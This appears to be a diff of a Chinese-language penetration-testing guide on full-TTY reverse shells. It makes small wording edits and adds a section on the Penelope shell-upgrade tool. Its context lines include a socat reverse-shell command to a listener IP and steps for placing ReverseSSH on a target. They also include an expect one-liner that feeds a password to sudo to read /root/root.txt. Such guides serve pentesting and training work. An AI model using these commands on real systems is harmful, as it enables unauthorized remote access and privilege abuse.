@@ -69,7 +69,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 一种方便的**交互式shell访问**、**文件传输**和**端口转发**的方法是将静态链接的ssh服务器[ReverseSSH](https://github.com/Fahrj/reverse-ssh)放到目标上。
 
-以下是针对`x86`的示例，使用upx压缩的二进制文件。有关其他二进制文件，请查看[发布页面](https://github.com/Fahrj/reverse-ssh/releases/latest/)。
+以下是针对`x86`的示例，使用了upx压缩的二进制文件。有关其他二进制文件，请查看[发布页面](https://github.com/Fahrj/reverse-ssh/releases/latest/)。
 
 1. 在本地准备以捕获ssh端口转发请求：
 
@@ -112,9 +112,15 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) 自动将 Linux 反向 shell 升级为 TTY，处理终端大小，记录所有内容等等。它还为 Windows shell 提供 readline 支持。
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## No TTY
 
-如果由于某种原因您无法获得完整的 TTY，您**仍然可以与期望用户输入的程序进行交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
+如果由于某种原因您无法获得完整的 TTY，您 **仍然可以与期望用户输入的程序交互**。在以下示例中，密码被传递给 `sudo` 以读取文件：
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
